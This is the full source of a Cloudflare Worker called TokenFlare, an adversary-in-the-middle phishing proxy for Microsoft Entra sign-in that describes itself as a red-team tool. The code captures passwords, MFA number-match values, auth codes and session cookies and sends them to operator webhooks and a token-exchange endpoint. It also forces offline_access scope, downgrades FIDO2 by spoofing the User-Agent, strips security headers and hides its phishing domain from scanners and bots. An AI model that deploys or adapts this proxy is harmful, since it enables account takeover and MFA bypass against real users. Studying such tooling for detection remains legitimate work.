/**
 * TokenFlare - Cloudflare Worker AiTM Proxy
 * For authorized security testing only
 */

/// ─────────────────────────────────────────────────────────────
/// Configuration Defaults
/// ─────────────────────────────────────────────────────────────

// Fallback defaults - typically overridden by wrangler.toml [vars]
const DEFAULTS = {
  upstreamHost: 'login.microsoftonline.com',
  upstreamPath: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=93572',
  clientTenant: 'common',
  forceHttps: 'true',
  replaceHostRegex: /login\.microsoftonline\.com/gi,
  debug: 'false',
  // Blocking lists - extend via wrangler.toml
  blockedIpPrefixes: ['0.0.0.0', '8.8.8.', '8.8.4.'],
  allowedIps: null,
  blockedUaSubs: ['googlebot', 'bingbot', 'bot'],
  blockedAsOrgs: ['google proxy', 'digital ocean'],
  enableUaCheck: 'true',
  enableAsOrgCheck: 'true',
  enableMozillaCheck: 'true',
  userAgentString: '',
  finalRedirUrl: 'https://www.office.com',
  unauthRedirUrl: 'https://www.office.com',
  lurePath: '/verifyme',
  lureParam: 'uuid',
  lureUuid: ['change-me-in-wrangler-toml']
};


/// ─────────────────────────────────────────────────────────────
/// Workers KV Session Correlation
/// ─────────────────────────────────────────────────────────────

async function storeSessionEvent(env, sessionId, eventType, data) {
    if (!env.SESSIONS || !sessionId) return;

    try {
        // Read existing session
        const existing = await env.SESSIONS.get(sessionId, 'json') || {
            id: sessionId,
            started: new Date().toISOString(),
            events: [],
        };

        // Append new event
        existing.events.push({
            type: eventType,
            timestamp: new Date().toISOString(),
            data: data,
        });
        existing.last_updated = new Date().toISOString();

        // Write back with 24-hour TTL
        await env.SESSIONS.put(sessionId, JSON.stringify(existing), {
            expirationTtl: 86400,
        });
    } catch (e) {
        // KV operations are best-effort — never block the proxy flow
    }
}

/// ─────────────────────────────────────────────────────────────
/// Request pipeline i.e. main()
/// ─────────────────────────────────────────────────────────────

export default {
  async fetch(request, env) {
    const cfg = loadConfig(env);
    const log = makeLogger(cfg.debug);

    // Session correlation — extract or create session ID
    let sessionId = '';
    const cookieHeader = request.headers.get('cookie') || '';
    const sessionMatch = cookieHeader.match(/tf_sid=([a-f0-9-]+)/);
    if (sessionMatch) {
        sessionId = sessionMatch[1];
    } else {
        sessionId = crypto.randomUUID();
    }

    // 0) Session retrieval API endpoints (operator-facing)
    const url = new URL(request.url);
    if (url.pathname === '/api/session' && request.method === 'GET') {
        const sid = url.searchParams.get('id');
        if (sid && env.SESSIONS) {
            const session = await env.SESSIONS.get(sid, 'json');
            if (session) {
                return new Response(JSON.stringify(session, null, 2), {
                    headers: { 'Content-Type': 'application/json' },
                });
            }
        }
        return new Response('{"error": "session not found"}', { status: 404 });
    }

    if (url.pathname === '/api/sessions' && request.method === 'GET') {
        if (env.SESSIONS) {
            const list = await env.SESSIONS.list({ limit: 50 });
            return new Response(JSON.stringify(list.keys.map(k => ({
                id: k.name,
                expiration: k.expiration,
            }))), { headers: { 'Content-Type': 'application/json' } });
        }
        return new Response('[]', { headers: { 'Content-Type': 'application/json' } });
    }

    // 1) preFlight blocks & checks
    const denyResp = preflightBlocks(request, cfg, log);
    // all passed => returns null
    if (denyResp) return denyResp;

    // 2) Prepare upstream URL + headers
    const clientUrl = new URL(request.url);
    let upstreamUrl = makeUpstreamUrl(clientUrl, cfg);
    const proxyHeaders = makeProxyHeaders(request.headers, cfg.upstreamHost, `${upstreamUrl.protocol}//${clientUrl.hostname}`, cfg.userAgentString);

    // Enhancement 3: Scope injection — ensure offline_access is in the authorize scope
    if (upstreamUrl !== 'unauthenticated' && upstreamUrl.toString().includes('/oauth2/v2.0/authorize') && !upstreamUrl.toString().includes('offline_access')) {
      const urlStr = upstreamUrl.toString().replace(/scope=([^&]+)/, (match, scope) => {
        const decoded = decodeURIComponent(scope);
        if (!decoded.includes('offline_access')) {
          return 'scope=' + encodeURIComponent(decoded + ' offline_access');
        }
        return match;
      });
      upstreamUrl = new URL(urlStr);
      log.info('Scope injection: added offline_access to authorize request');
    }
    
    // 3) Redirect unauthenticated requests
    if (upstreamUrl === 'unauthenticated') {
      return Response.redirect(cfg.unauthRedirUrl, 302);
    }

    // 4) Opportunistic credential capture (non-blocking)
    if (request.method === 'POST') {
      parseCredentialsFromBody(request).then(async creds => {
        if (creds) {
          await notifyCredentials(cfg.webhookUrl, creds, log, sessionId).catch(console.error);
          storeSessionEvent(env, sessionId, 'credentials', { username: creds.username, has_password: true }).catch(() => {});
        }
      }).catch(() => {});
    }

    // 5) FIDO2 downgrade: spoof UA to Safari/Windows (seen as FIDO2-incompatible by Entra)
    if (env.FIDO2_DOWNGRADE === 'true') {
      proxyHeaders.set('User-Agent',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15');
      log.info('FIDO2 downgrade: spoofed User-Agent for upstream request');
    }

    // Enhancement 4: Strip Cloudflare detection headers before upstream fetch
    const headersToStrip = [
      'cf-connecting-ip', 'cf-ipcountry', 'cf-ray', 'cf-visitor',
      'x-forwarded-for', 'x-forwarded-proto', 'x-real-ip',
      'cdn-loop', 'cf-ew-via',
    ];
    for (const h of headersToStrip) {
      proxyHeaders.delete(h);
    }
    // Rewrite Referer and Origin to hide phishing domain
    if (proxyHeaders.has('referer')) {
      const ref = proxyHeaders.get('referer');
      proxyHeaders.set('referer', ref.replace(env.LOCAL_PHISHING_DOMAIN || '', 'login.microsoftonline.com'));
    }
    if (proxyHeaders.has('origin')) {
      proxyHeaders.set('origin', 'https://login.microsoftonline.com');
    }

    // 6) Proxy to upstream
    const upstreamResp = await fetch(upstreamUrl.toString(), {
      method: request.method,
      headers: proxyHeaders,
      body: request.body,                 // safe: we read from a clone above
      redirect: 'manual',
    });

    // WS upgrades pass straight through
    if (isWebSocketUpgrade(proxyHeaders)) return upstreamResp;

    // Enhancement 1: Number matching capture from SAS/BeginAuth
    if (upstreamUrl.toString().includes('/SAS/BeginAuth') || upstreamUrl.toString().includes('/common/SAS/BeginAuth')) {
      try {
        const sasBody = await upstreamResp.clone().json();
        if (sasBody.Entropy !== undefined) {
          const webhook = cfg.webhookUrl || '';
          if (webhook) {
            fetch(webhook, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                source: 'TokenFlare',
                type: 'mfa_number_match',
                timestamp: new Date().toISOString(),
                entropy: sasBody.Entropy,
                session_id: sasBody.SessionId || '',
                auth_method: sasBody.AuthMethodId || '',
                kv_session_id: sessionId,
              }),
            }).catch(() => {});
          }
          storeSessionEvent(env, sessionId, 'number_match', { entropy: sasBody.Entropy }).catch(() => {});
          log.info(`MFA number match captured: ${sasBody.Entropy}`);
        }
      } catch (e) {
        // Ignore parse errors — not all responses are JSON
      }
    }

    // Enhancement 2: MFA method/result capture from SAS/EndAuth
    if (upstreamUrl.toString().includes('/SAS/EndAuth') || upstreamUrl.toString().includes('/common/SAS/EndAuth')) {
      try {
        const endBody = await upstreamResp.clone().json();
        const webhook = cfg.webhookUrl || '';
        if (webhook) {
          fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              source: 'TokenFlare',
              type: 'mfa_result',
              timestamp: new Date().toISOString(),
              success: endBody.Success || false,
              auth_method: endBody.AuthMethodId || '',
              result_value: endBody.ResultValue || '',
              session_id: sessionId,
            }),
          }).catch(() => {});
        }
        storeSessionEvent(env, sessionId, 'mfa_result', { success: endBody.Success || false, method: endBody.AuthMethodId || '' }).catch(() => {});
        log.info(`MFA result captured: success=${endBody.Success}, method=${endBody.AuthMethodId}`);
      } catch (e) {
        // Ignore parse errors
      }
    }

    // 7) GetCredentialType intercept: send auth method intel to webhook
    if (cfg.webhookUrl && upstreamUrl.toString().includes('/GetCredentialType')) {
      try {
        const gctBody = await upstreamResp.clone().text();
        fetch(cfg.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            source: 'TokenFlare',
            type: 'credential_type_intel',
            timestamp: new Date().toISOString(),
            data: gctBody,
            session_id: sessionId,
          }),
        }).catch(() => {});
        // Parse GCT for session event metadata
        try {
          const gctParsed = JSON.parse(gctBody);
          const authMethods = [];
          if (gctParsed.Credentials) {
            for (const cred of gctParsed.Credentials) {
              if (cred.PrefCredential !== undefined) authMethods.push(cred.PrefCredential);
            }
          }
          storeSessionEvent(env, sessionId, 'gct_intel', { auth_methods: authMethods }).catch(() => {});
        } catch (_) {
          storeSessionEvent(env, sessionId, 'gct_intel', { raw: true }).catch(() => {});
        }
        log.info('GetCredentialType response intercepted and sent to webhook');
      } catch (e) {
        // Ignore parse errors — non-blocking
      }
    }

    // 8) Build downstream response
    let outHeaders = relaxSecurityHeaders(upstreamResp.headers);

    // Enhancement 5: Strip Microsoft telemetry headers from responses
    const responseHeadersToStrip = [
      'x-ms-diagnostics', 'x-ms-request-id', 'x-ms-ests-server',
      'x-ms-clitelem',
    ];
    for (const h of responseHeadersToStrip) {
      outHeaders.delete(h);
    }

    let locationHeader;
    if (outHeaders.has("Location")){
        // when Entra redirects the user away from login.microsoftonline.com
        locationHeader = decodeURIComponent(outHeaders.get("Location"));

        // when the redirect fits the redir from the intended upstream URI e.g. nativeclient, or office landing
        if (locationHeader.toLowerCase().includes(decodeURIComponent(cfg.redirectUri.toLowerCase()))){
            log.info('Redirect URI in Location header');
            // then try to get the code param from the location header
            if (locationHeader.includes("code=")){
                log.info("Auth code found.");
                let authcodeUri = locationHeader;
		log.info(authcodeUri);
                // Send structured payload for automatic exchange + human-readable notification
                const authParams = parseAuthCodeUrl(authcodeUri);
                const upstreamParams = parseUpstreamParams(cfg.upstreamPath);
                await notifyAuthCodeStructured(cfg.webhookUrl, authParams, upstreamParams, authcodeUri, request, upstreamResp, sessionId, log)
                  .catch(console.error);
                storeSessionEvent(env, sessionId, 'auth_code', { has_code: true }).catch(() => {});
            }
            // then send the user to final redir
            outHeaders.set("Location", cfg.finalRedirUrl);
            log.info("Redirected to final redir");
        }
    }

    // 9) Cookie capture - notify on auth cookies (expanded set)
    const authCookieNames = new Set([
      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
      'SignInStateCookie', 'AADSSO', 'SSOCOOKIE',
      'x-ms-RefreshTokenCredential',
      'ch',           // Proof of Possession hash
      'esctx',        // CSRF binding token
      'buid',         // Browser unique ID
      'fpc',          // First party cookie
      'stsservicecookie',
      'wlidp',
    ]);

    const cookiesSet = getSetCookies(outHeaders);
    const capturedCookies = [];
    for (const cookie of cookiesSet) {
      const eqIdx = cookie.indexOf('=');
      if (eqIdx === -1) continue;
      const name = cookie.substring(0, eqIdx).trim();
      if (authCookieNames.has(name)) {
        capturedCookies.push(cookie);
      }
    }
    if (capturedCookies.length > 0) {
      await notifyCookies(cfg.webhookUrl, capturedCookies.join('\n\n'), log, sessionId).catch(console.error);
      storeSessionEvent(env, sessionId, 'cookies', { count: capturedCookies.length }).catch(() => {});
    }

    // 10) Rewrite Set-Cookie domains
    const cookieRewrite = rewriteSetCookieDomains(outHeaders, cfg.replaceHostRegex, clientUrl.hostname);
    if (cookieRewrite) {
      outHeaders = relaxSecurityHeaders(cookieRewrite.headers);
    }

    // 11) Set session cookie on response if new
    if (!sessionMatch) {
        outHeaders.append('Set-Cookie', `tf_sid=${sessionId}; Path=/; Secure; HttpOnly; SameSite=None; Max-Age=3600`);
    }

    // 12) Rewrite body hostnames if textual
    const contentType = outHeaders.get('content-type') || '';
    const body = await maybeRewriteBody(upstreamResp, contentType, cfg.replaceHostRegex, clientUrl.hostname);

    return new Response(body, { status: upstreamResp.status, headers: outHeaders });
  },
};

/// ─────────────────────────────────────────────────────────────
/// Guards / builders
/// ─────────────────────────────────────────────────────────────


function preflightBlocks(request, cfg, log) {
  const ip = request.headers.get('cf-connecting-ip') || '';
  const ua = (request.headers.get('user-agent') || '').toLowerCase();
  const asOrg = ((request.cf && request.cf.asOrganization) || '').toLowerCase();
  log.info(`Visited by ip: ${ip}, user-agent: ${ua}, asOrg: ${asOrg}.`);

  // IP prefix check
  if (ip && cfg.blockedIpPrefixes.some((p) => ip.startsWith(p))) {
    log.info('blocked by ip prefix', ip);
    return new Response('Access denied.', { status: 403 });
  }

  // allowed IP check. Only enabled if the allowed IP list is not empty and not null
  if (cfg.allowedIps !== null && cfg.allowedIps.length !== 0) {
    if (!cfg.allowedIps.includes(ip)) {
      log.info('not in allowed IP addresses.');
      return new Response('Access denied.', { status: 403 });
    }
  }

  // UA substrings
  if (cfg.enableUaCheck && ua) {
    for (const sub of cfg.blockedUaSubs) {
      if (ua.includes(sub)) {
        log.info('blocked by UA', sub);
        return new Response('Access denied.', { status: 403 });
      }
    }
  }

  // AS org
  if (cfg.enableAsOrgCheck && asOrg) {
    for (const s of cfg.blockedAsOrgs) {
      if (asOrg.includes(s)) {
        log.info('blocked by AS org', asOrg);
        return new Response('Access denied.', { status: 403 });
      }
    }
  }

  // "real browser" heuristic: require mozilla/5.0 if enabled
  if (cfg.enableMozillaCheck) {
    if (!ua.includes('mozilla/5.0')) {
      log.info('blocked by mozilla check');
      return new Response('Access denied', { status: 403 });
    }
  }
  // need to pass all checks to get a null return
  return null;
}


/** Build upstream URL based on client URL + config. */
/** Also blocks non-lure initial clicks **/
function makeUpstreamUrl(clientUrl, cfg) {
  const u = new URL(clientUrl.toString());
  const idInUrl = u.searchParams.get(cfg.lureParam);
  u.protocol = cfg.forceHttps ? 'https:' : 'http:';
  u.host = cfg.upstreamHost;

  // if visiting / or (/verifyme without valid UUID), redir to unauth place
  if (u.pathname === '/' || (u.pathname === cfg.lurePath && !cfg.lureUuid.includes(idInUrl))) {

    return 'unauthenticated';
  // case where user is legitimately phished, redir to /oauth/v2.0/... to initiate
  } else if(u.pathname === cfg.lurePath && cfg.lureUuid.includes(idInUrl)){
      return new URL(u.protocol + '//' + cfg.upstreamHost + cfg.upstreamPath);
  } else {
  // for non-root we just passthrough as is.
    return u;
  }
}

/** Prepare headers for upstream (Host, Referer etc.). */
function makeProxyHeaders(origHeaders, upstreamHost, refererOrigin, userAgentString) {
  const h = new Headers(origHeaders);
  h.set('Host', upstreamHost);
  h.set('Origin', 'https://' + upstreamHost);
  h.set('Referer', refererOrigin);
  if (userAgentString !== '') {
      h.set('User-Agent', userAgentString);
  }
  // Intentional IoC for blue team detection in Entra ID logs
  h.set('X-TokenFlare', 'Authorised-Security-Testing');
  return h;
}

function isWebSocketUpgrade(headers) {
  return (headers.get('upgrade') || '').toLowerCase() === 'websocket';
}

/// ─────────────────────────────────────────────────────────────
/// Body & header rewriting
/// ─────────────────────────────────────────────────────────────

/** Loosen security headers and add permissive CORS, like original code. */
function relaxSecurityHeaders(inHeaders) {
  const h = new Headers(inHeaders);
  h.set('access-control-allow-origin', '*');
  h.set('access-control-allow-credentials', 'true');
  h.delete('content-security-policy');
  h.delete('content-security-policy-report-only');
  h.delete('clear-site-data');
  return h;
}

/**
 * Rewrites Set-Cookie domain occurrences of the upstream host to the client host.
 * Returns null if nothing to change.
 */
function rewriteSetCookieDomains(inHeaders, replaceHostRegex, clientHost) {
  const setCookies = getSetCookies(inHeaders);
  if (!setCookies.length) return null;

  const h = new Headers(inHeaders);
  h.delete('set-cookie'); // We'll add modified copies

  const modified = setCookies.map(sc => sc.replace(replaceHostRegex, clientHost));
  for (const sc of modified) h.append('set-cookie', sc);

  return { headers: h, cookies: modified };
}

/** Only rewrite response body if it's textual. */
async function maybeRewriteBody(resp, contentType, hostRegex, clientHost) {
  if (!isTextLike(contentType)) {
    return resp.body; // binary/stream: pass through
  }
  try {
    const text = await resp.text();
    return text.replace(hostRegex, clientHost);
  } catch (e) {
    console.error('Body rewrite failed:', e);
    // Fallback: return original as text (best effort)
    return await resp.clone().text().catch(() => resp.body);
  }
}

/** True if safe to treat as text. */
function isTextLike(contentType) {
  const ct = contentType.toLowerCase();
  return (
    ct.includes('text/') ||
    ct.includes('application/javascript') ||
    ct.includes('application/json') ||
    ct.includes('application/xhtml') ||
    ct.includes('application/xml')
  );
}

/** Header variations across runtimes (CF edge vs Miniflare/Undici). */
function getSetCookies(headers) {
  if (typeof headers.getAll === 'function') {
    try { return headers.getAll('set-cookie') || []; } catch {}
  }
  if (typeof headers.getSetCookie === 'function') {
    try { return headers.getSetCookie() || []; } catch {}
  }
  const one = headers.get('set-cookie');
  return one ? [one] : [];
}

/// ─────────────────────────────────────────────────────────────
/// Utils
/// ─────────────────────────────────────────────────────────────

/** Read runtime config from env with safe fallbacks. */
function loadConfig(env) {

    let upstreamPath = env.UPSTREAM_PATH || DEFAULTS.upstreamPath;
    // if someone set a client tenant in wrangler file, we rewrite the first URL they would (i.e. first upstream path)
    let clientTenant;
    if (env.CLIENT_TENANT) {
        clientTenant = env.CLIENT_TENANT;
        upstreamPath = upstreamPath.replace('common', clientTenant);
    } else {
        clientTenant = DEFAULTS.clientTenant;
    }

    let queryParams = new URLSearchParams(upstreamPath);
    let redirURI = queryParams.get("redirect_uri");

  return {
    // proxy settings
    upstreamHost: env.UPSTREAM || DEFAULTS.upstreamHost,
    upstreamPath: upstreamPath,
    replaceHostRegex: env.UPSTREAM_HOSTNAME_REGEX ? new RegExp(env.UPSTREAM_HOSTNAME_REGEX, 'gi') : DEFAULTS.replaceHostRegex,
    forceHttps: parseBool(env.FORCE_HTTPS) || DEFAULTS.forceHttps,
    // blocking & allowlisting
    allowedIps: parseCsv(env.ALLOWED_IPS) ?? DEFAULTS.allowedIps,
    blockedIpPrefixes: parseCsv(env.BLOCKEDIP_PREFIX) || DEFAULTS.blockedIpPrefixes,
    blockedUaSubs:  parseCsv(env.BLOCKEDUA_SUB) || DEFAULTS.blockedUaSubs,
    blockedAsOrgs:  parseCsv(env.BLOCKEDAS_ORG) || DEFAULTS.blockedAsOrgs,
    enableUaCheck: parseBool(env.ENABLE_UA_CHECK) || DEFAULTS.enableUaCheck,
    enableAsOrgCheck: parseBool(env.ENABLE_AS_ORG_CHECK) || DEFAULTS.enableAsOrgCheck,
    enableMozillaCheck: parseBool(env.ENABLE_MOZILLA_CHECK) || DEFAULTS.enableMozillaCheck,
    // client settings
    clientTenant: clientTenant,
    // custom UA to send MS, defaults to proxying the user's UA
    userAgentString: env.CUSTOM_USER_AGENT || DEFAULTS.userAgentString,
    // debugging & notification
    debug: env.DEBUGGING || DEFAULTS.debug,
    // redirect URI, generated from UPSTREAM_PATH
    redirectUri: redirURI,
    webhookUrl: env.WEBHOOK_URL || '',
    // final redirect URL, where the user would be sent to after authentication,
    // n.b. you could sent them to auth again on a different client! :D
    finalRedirUrl: env.FINAL_REDIR || DEFAULTS.finalRedirUrl,
    // where you point users to when they visits webroot, or /<lurePath> without proper UUID
    unauthRedirUrl: env.UNAUTH_REDIR || DEFAULTS.unauthRedirUrl,
    // lure settings
    lurePath: env.LURE_PATH || DEFAULTS.lurePath,
    lureParam: env.LURE_PARAM || DEFAULTS.lureParam,
    lureUuid: parseCsv(env.LURE_UUID) || DEFAULTS.lureUuid,

  };
}

/** "a, b , c" -> ["a","b","c"] */
function parseCsv(str) {
  if (!str) return null;
  return str.split(',').map(s => s.trim()).filter(Boolean);
}

/* return true from 'true', false from 'false', etc*/
function parseBool(v, def = false) {
  if (v == null) return def;
  const s = String(v).trim().toLowerCase();
  return s === '1' || s === 'true' || s === 'yes' || s === 'on';
}

function makeLogger(enabled) {
  return {
    info: (...a) => enabled && console.log('[info]', ...a),
    warn: (...a) => enabled && console.warn('[warn]', ...a),
    error: (...a) => enabled && console.error('[err]', ...a),
  };
}

/// ─────────────────────────────────────────────────────────────
/// Credential & cookie capture
/// ─────────────────────────────────────────────────────────────

/** Best‑effort form credential parsing for POST bodies. */
async function parseCredentialsFromBody(request) {
  if (request.method !== 'POST') return null;

  let body;
  try {
    body = await request.clone().text();
  } catch {
    return null;
  }

  const params = new URLSearchParams(body);
  const login = params.get('login');
  const passwd = params.get('passwd');
  if (!login || !passwd) return null;

  const decode = v => decodeURIComponent(v.replace(/\+/g, ' '));
  return { username: decode(login), password: decode(passwd) };
}


async function notifyAuthCode(webhook, url, log) {
  await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${url}`, log);
}

/**
 * Send structured auth code payload for automatic token exchange.
 * Fires BOTH the human-readable notification AND a structured JSON to /exchange.
 */
async function notifyAuthCodeStructured(webhook, authParams, upstreamParams, rawUrl, request, upstreamResp, sessionId, log) {
  if (!webhook) {
    log.warn('No webhook configured');
    return;
  }

  // 1. Human-readable notification via existing pipeline
  await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${rawUrl}`, log);

  // 2. Extract auth cookies from the upstream response Set-Cookie headers (expanded set)
  const structuredAuthCookies = new Set([
    'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
    'SignInStateCookie', 'AADSSO', 'SSOCOOKIE',
    'x-ms-RefreshTokenCredential',
    'ch', 'esctx', 'buid', 'fpc', 'stsservicecookie', 'wlidp',
  ]);
  const cookies = [];
  const setCookieHeaders = getSetCookies(upstreamResp.headers);
  for (const header of setCookieHeaders) {
    const parts = header.split(';');
    const [nameValue] = parts;
    const eqIdx = nameValue.indexOf('=');
    if (eqIdx === -1) continue;
    const name = nameValue.substring(0, eqIdx).trim();
    const value = nameValue.substring(eqIdx + 1).trim();

    if (structuredAuthCookies.has(name)) {
      cookies.push({
        name: name,
        value: value,
        domain: 'login.microsoftonline.com',
        path: '/',
        secure: true,
        httpOnly: true,
        sameSite: 'None',
      });
    }
  }

  const userAgent = request.headers.get('user-agent') || '';

  // 3. Structured JSON to /exchange endpoint for automatic token exchange
  const exchangeUrl = webhook.replace(/\/webhook\/?$/, '/exchange');
  const payload = {
    event: 'auth_code',
    timestamp: new Date().toISOString(),
    session_id: sessionId,
    code: authParams.code,
    client_id: upstreamParams.client_id,
    redirect_uri: upstreamParams.redirect_uri,
    scope: upstreamParams.scope,
    response_type: upstreamParams.response_type,
    state: authParams.state,
    session_state: authParams.session_state,
    id_token: authParams.id_token,
    raw_url: rawUrl,
    cookies: cookies,
    user_agent: userAgent,
  };

  try {
    const response = await fetch(exchangeUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (!response.ok) {
      log.error(`Exchange endpoint failed: ${response.status}`);
    } else {
      log.info('Structured auth code sent to exchange endpoint');
    }
  } catch (error) {
    // Exchange endpoint may not be running — fall back silently
    log.warn(`Exchange endpoint not available: ${error.message}`);
  }
}

/**
 * Parse the Entra redirect URL into structured components.
 */
function parseAuthCodeUrl(redirectUrl) {
  try {
    let searchStr = redirectUrl;
    if (redirectUrl.includes('?')) {
      searchStr = redirectUrl.split('?').slice(1).join('?');
    } else if (redirectUrl.includes('#')) {
      searchStr = redirectUrl.split('#').slice(1).join('#');
    }
    const params = new URLSearchParams(searchStr);
    return {
      code: params.get('code'),
      state: params.get('state'),
      session_state: params.get('session_state'),
      id_token: params.get('id_token'),
    };
  } catch (e) {
    return { code: null };
  }
}

/**
 * Extract client_id, redirect_uri, and scope from the UPSTREAM_PATH config.
 */
function parseUpstreamParams(upstreamPath) {
  try {
    const params = new URLSearchParams(upstreamPath.split('?').slice(1).join('?'));
    return {
      client_id: params.get('client_id'),
      redirect_uri: params.get('redirect_uri'),
      scope: params.get('scope'),
      response_type: params.get('response_type'),
    };
  } catch (e) {
    return {};
  }
}

async function notifyCredentials(webhook, { username, password }, log, sessionId) {
  await notify(webhook, `[TokenFlare] Password Captured!\n\nUser: ${escapeHtml(username)}\nPassword: ${escapeHtml(password)}\nSession: ${sessionId || 'n/a'}`, log);
}

async function notifyCookies(webhook, cookies, log, sessionId) {
  await notify(webhook, `[TokenFlare] Cookies Captured!\n\nSession: ${sessionId || 'n/a'}\n${cookies}`, log);
}

/// ─────────────────────────────────────────────────────────────
/// Multi-provider webhook notifications
/// ─────────────────────────────────────────────────────────────

/**
 * Auto-detect webhook provider from URL and send notification
 * Supports: Slack, Discord, Teams, Generic (raw JSON POST)
 */
async function notify(webhook, message, log) {
  if (!webhook) {
    log.warn('No webhook configured');
    return;
  }

  const provider = detectProvider(webhook);
  const payload = formatPayload(message, provider);

  try {
    const response = await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      log.error(`Webhook failed (${provider}): ${response.status}`);
    } else {
      log.info(`Notification sent via ${provider}`);
    }
  } catch (error) {
    log.error(`Webhook error (${provider}): ${error.message}`);
  }
}

/**
 * Detect webhook provider from URL
 */
function detectProvider(webhook) {
  const url = webhook.toLowerCase();
  if (url.includes('discord.com/api/webhooks') || url.includes('discordapp.com/api/webhooks')) {
    return 'discord';
  } else if (url.includes('hooks.slack.com')) {
    return 'slack';
  } else if (url.includes('webhook.office.com') || url.includes('.webhook.office.com')) {
    return 'teams';
  }
  return 'generic';
}

/**
 * Format payload for specific provider
 */
function formatPayload(message, provider) {
  switch (provider) {
    case 'discord':
      return formatDiscord(message);
    case 'slack':
      return formatSlack(message);
    case 'teams':
      return formatTeams(message);
    default:
      return formatGeneric(message);
  }
}

/**
 * Slack format: { text: "message" }
 */
function formatSlack(message) {
  return { text: message };
}

/**
 * Discord format: { content: "message" } with 2000 char limit
 * Discord also supports embeds for richer formatting
 */
function formatDiscord(message) {
  // Discord has 2000 char limit for content
  const truncated = message.length > 1900
    ? message.substring(0, 1900) + '\n... (truncated)'
    : message;

  return {
    content: truncated,
    username: 'TokenFlare',
    embeds: [{
      title: '🎣 TokenFlare Alert',
      description: truncated,
      color: 0xff6600,  // Orange
      footer: { text: 'TokenFlare - Authorised Testing Only' }
    }]
  };
}

/**
 * Microsoft Teams format: Adaptive Card
 */
function formatTeams(message) {
  return {
    "@type": "MessageCard",
    "@context": "http://schema.org/extensions",
    "themeColor": "ff6600",
    "summary": "TokenFlare Alert",
    "sections": [{
      "activityTitle": "🎣 TokenFlare Alert",
      "text": message.replace(/\n/g, '<br>'),
      "markdown": true
    }]
  };
}

/**
 * Generic format: raw JSON with message field
 */
function formatGeneric(message) {
  return {
    source: 'TokenFlare',
    timestamp: new Date().toISOString(),
    message: message
  };
}

/** Minimal HTML escape for safe rendering. */
function escapeHtml(s) {
  return s.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
}


